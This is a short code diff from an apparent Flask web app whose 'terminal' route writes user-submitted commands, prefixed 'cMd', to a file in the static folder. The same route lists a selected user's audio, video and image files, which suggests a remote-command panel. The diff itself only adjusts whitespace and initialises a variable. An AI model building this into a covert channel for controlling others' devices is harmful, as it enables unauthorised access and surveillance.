@@ -469,8 +469,9 @@ def terminal():
         return render_template("terminal.html",user=selected_user,audios=audios,videos=videos,images=images)
     elif request.method == "POST":
         cmd = request.get_json()
-        if "input" in cmd:
+        if "input" in cmd:		
             if cmd["input"]:
+	            output = None
 	            with open(os.path.join(STATIC_FOLDER,"message.txt"),"w") as file:
 	                cmd1 = cmd["input"]
 	                file.write(f"cMd {cmd1}")
